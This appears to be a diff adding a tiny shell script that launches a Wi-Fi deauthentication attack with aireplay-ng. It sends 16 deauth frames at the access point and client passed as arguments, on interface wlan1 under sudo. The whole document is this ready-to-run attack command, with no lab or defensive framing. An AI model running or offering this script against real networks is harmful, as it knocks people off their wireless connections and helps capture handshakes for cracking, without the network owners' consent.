@@ -1,0 +1,3 @@
+#! /bin/sh
+
+sudo aireplay-ng --deauth 16 -a "$1" -c "$2" wlan1
